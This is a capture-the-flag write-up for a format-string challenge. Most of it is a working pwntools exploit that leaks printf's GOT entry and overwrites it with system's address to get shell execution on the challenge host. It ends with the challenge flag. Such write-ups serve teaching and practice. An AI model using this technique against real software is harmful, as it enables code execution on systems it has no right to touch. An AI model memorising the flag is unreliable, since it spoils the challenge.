# Yet another format string bug

## Solution

Make use of partial overwrite to the stack (at `%7$n`). There is originally address of some element on the stack, so partially overwriting one byte may or may not lead to the corruption of loop condition variable. If lucky enough, the variable is changed and we can use more than one format string attack.

The following exploit gambles for loop condition overwrite, and overwrite address of `printf` to `system`, making the program execute shell script from standard input.

```python
import pwn
pwn.context.log_level = 'debug'

# libc = pwn.ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc = pwn.ELF('./libc.so.6')
printf_addr = libc.symbols['printf']
system_addr = libc.symbols['system']

print(hex(printf_addr))
print(hex(system_addr))

while True:
    # p = pwn.process('./yet_another_fsb')
    HOST='0025a2a25ef52497109f8b5c0b8a5c86.chal.ctf.ae'
    p = pwn.remote(HOST,443, ssl=True, sni=HOST)
    try:
        # Gamble to trigger loop
        p.send(b'abcd%7$n' + b'\xee')
        k = p.recv(12)

        
        v5_addr = pwn.u64(k[4:].ljust(8, b'\0'))
        # print(hex(v5_addr))
        
        # leak printf addr

        payload = b''
        payload += b'%7$sASDF'
        payload += pwn.p64(0x404000)
        p.send(payload)
        real_printf_addr = pwn.u64(p.recvuntil(b'ASDF')[:-4].ljust(8,b'\0'))
        print(hex(real_printf_addr))

        real_system_addr = real_printf_addr - printf_addr + system_addr
        print(hex(real_system_addr))
        


        # overwrite printf addr to system addr
        payload = b''
        curr=0
        for i,x in enumerate(list(pwn.p64(real_system_addr))):
            cnt=(x-curr -1)%256 +1
            print(x)
            curr_payload = (b'%' + str(cnt).encode() + b'c%' + str(22+i).encode() + b'$hhn')

            # align 16 bytes
            A_cnt = 16-len(curr_payload)
            assert len(curr_payload) + A_cnt == 16
            payload += curr_payload + b'A'*A_cnt
            curr += cnt + A_cnt
        assert len(payload) == 16*8
        for i in range(8):
            payload += pwn.p64(0x404000+i)
        # overwrite printf got
        p.send(payload)
        p.recv()
        p.interactive()
        exit()
    except EOFError:
        p.close()
        
```

flag is: **flag{e3ushwhAnyCPxhiBSRxOY72OgfxGdRjy}**